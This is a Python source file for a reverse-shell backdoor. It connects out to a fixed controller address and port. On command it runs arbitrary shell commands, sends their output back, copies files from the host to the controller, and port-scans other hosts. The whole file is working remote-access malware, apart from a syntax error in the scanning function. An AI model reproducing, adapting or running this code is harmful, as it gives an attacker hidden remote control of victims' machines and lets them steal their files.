import socket
import subprocess
import os

def scanner(s,ip,ports):
    scan_result = ''
    for port in ports.split(","):
        try:
            sock = socket.socket()
            output = sock.connect_ex((ip,int(port)))
            if output == 0:
                scan_result = scan_result + "[+] port" + port + "is opened"
            else:
                scan_result = scan_result + "[-] port" + port + "is closed"
                sock.close()
        except Exception as e:
    s.send(scan_result.encode())

def transfer(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send("DONE".encode())
    else:
        s.send("file not found".encode())
    

def connect():
    s = socket.socket()
    s.connect(("192.168.42.112",8080))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab,path = command.decode().split("*")
            try:
                transfer(s,path)
            except:
                pass
        elif 'scan' in command.decode():
            command = command[5:].decode()
            ip,ports = command.split(":")
            scanner(s,ip,ports)
        else:
            cmd = subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())
def main():
    connect()
main()
